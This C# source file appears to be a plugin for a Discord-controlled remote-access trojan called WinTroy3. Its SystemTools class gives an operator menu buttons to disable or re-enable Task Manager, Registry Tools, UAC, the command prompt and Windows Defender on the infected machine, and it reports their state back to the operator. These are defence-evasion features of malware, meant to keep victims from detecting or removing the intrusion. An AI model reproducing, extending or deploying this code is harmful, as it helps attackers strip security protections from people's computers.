using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WinTroy3_PluginLib;
using Discord;
using static BaseApp.WinTool;
using BaseApp;
using System.Runtime.Serialization;

public class SystemTools
{
    public static Respond Disable()
    {
        var toolString = Reg.GetDataString("selectsystemtool");
        var tool = (TOOL)Enum.Parse(typeof(TOOL), toolString);
        WinTool.Disable(tool);
        return new Respond()
        {
            RespondTitle = "System Tool Disable",
            RespondText = $"Tried to disable {toolString}."
        };
    }

    public static Respond Enable()
    {
        var toolString = Reg.GetDataString("selectsystemtool");
        var tool = (TOOL)Enum.Parse(typeof(TOOL), toolString);
        WinTool.Enable(tool);
        return new Respond()
        {
            RespondTitle = "System Tool Enable",
            RespondText = $"Tried to enable {toolString}."
        };
    }

    public static Respond ShowSystemToolsMenu()
    {
        var selectMenu = new SelectMenuBuilder()
            .WithCustomId("_menu_selectsystemtool")
            .AddOption("Task Manager", "TaskManager")
            .AddOption("Registry Tools", "RegistryTools")
            .AddOption("UAC", "UserAccountControl")
            .AddOption("CMD", "CMD")
            .AddOption("CMD (Semi)", "CMDSemi")
            .AddOption("Windows Defender", "WindowsDefender");
        var text = $@"Enable or disable system tools.

Windows Defender Disabled: `Unknown`
CMD Disabled: `{IsDisabled(TOOL.CMD)}`
CMD Semi-Disabled: `{IsDisabled(TOOL.CMDSemi)}`
Registry Tools Disabled: `{IsDisabled(TOOL.RegistryTools)}`
Task Manager Disabled: `{IsDisabled(TOOL.TaskManager)}`
UAC Disabled: `{IsDisabled(TOOL.UserAccountControl)}`";
        if (!WinProcess.IsAdministrator())
            text += "\n\n**WARNING:** Your process isn't running with admin privileges, all functions (except for semi-CMD) do normally need admin privileges to run.";
        return new Respond
        {
            RespondTitle = "System Tools",
            RespondText = text,
            RespondSelectMenu = selectMenu,
            RespondButtons = new string[]
            {
                    "disablesystemtool",
                    "enablesystemtool"
            }
        };
    }
}